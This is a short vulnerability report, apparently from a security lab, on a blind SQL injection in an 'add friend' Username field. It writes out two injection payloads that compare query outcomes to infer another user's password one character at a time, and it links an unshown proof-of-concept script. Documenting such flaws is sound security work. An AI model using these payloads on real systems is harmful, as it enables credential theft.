# Vulnerability 11: SQL Injection in add friend page allows to infer user password

- Vulnerability: SQL Injection
- Where: `Username` in add friend page
- Impact: Allows user to infer the password of another user one letter at a time

## Steps to reproduce

1. Insert `ssofadmin' AND password LIKE BINARY 'S%' AND '1'='0' #` in Username field
2. Insert `ssofadmin' AND password LIKE BINARY 'S%' AND '1'='1' #` in Username field
3. If one query is successful and the other one isn't then the password of user `ssofadmin` begins with the letter 'S'

[(POC)](SQLvuln11.py)
